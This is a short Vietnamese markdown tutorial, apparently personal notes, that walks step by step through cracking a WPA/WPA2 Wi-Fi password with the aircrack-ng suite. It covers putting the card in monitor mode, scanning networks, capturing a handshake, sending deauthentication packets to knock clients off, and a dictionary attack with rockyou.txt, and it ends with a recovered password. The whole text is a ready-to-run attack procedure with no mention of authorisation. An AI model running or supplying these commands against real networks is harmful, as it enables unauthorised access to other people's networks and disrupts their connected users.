## 🛠️ Các bước thực hiện hack Wi-Fi (WPA/WPA2)

```bash
1. iwconfig
```

→ Kiểm tra các thiết bị kết nối mạng không dây.

```bash
2. sudo airmon-ng start wlan0
```
→ airmon-ng : bật tắt chế độ monitor và dừng tiến trình gây xung đột.

→ Bật chế độ monitor cho card mạng.

```bash
3. sudo airmon-ng check kill
```
→ Dừng các dịch vụ gây xung đột.

```bash
4. sudo airodump-ng wlan0mon
```
*công dụng airodump-ng*
  - quét và giám sát các mạng wifi xung quanh
  - thu thập được : SSID ( tên mạng ), BSSID ( địa chỉ MAC ), kênh ( channel ), mã hóa (WEP/WPA/WPA2), số lượng client kết nối.
  - Bắt handshake (quá trình xác thực giữa thiết bị và router) dùng để dò mật khẩu.
→ Quét và thu thập thông tin mạng Wi-Fi.
    **Ctrl + C** để thoát.

```bash
5. sudo airodump-ng --bssid <bssid> --channel <ch> --write wpa2hack wlan0mon
```

→ Bắt handshake WPA/WPA2 từ một Wi-Fi và lưu vào file `wpa2hack.cap`.

```bash
6. sudo aireplay-ng --deauth 4 -a <bssid> -c <station> wlan0mon
```

→ Gửi gói `deauth` để ngắt kết nối thiết bị khỏi Wi-Fi.
Mục đích: ép thiết bị kết nối lại để bết handshake.

```bash
7. sudo aircrack-ng <file.cap> -w /usr/share/wordlists/rockyou.txt
```

→ Dò mật khẩu Wi-Fi bằng file từ điển `rockyou.txt`.

---

### ✅ Kết quả:

```
Sanh Dieu [ 00001111 ]
```
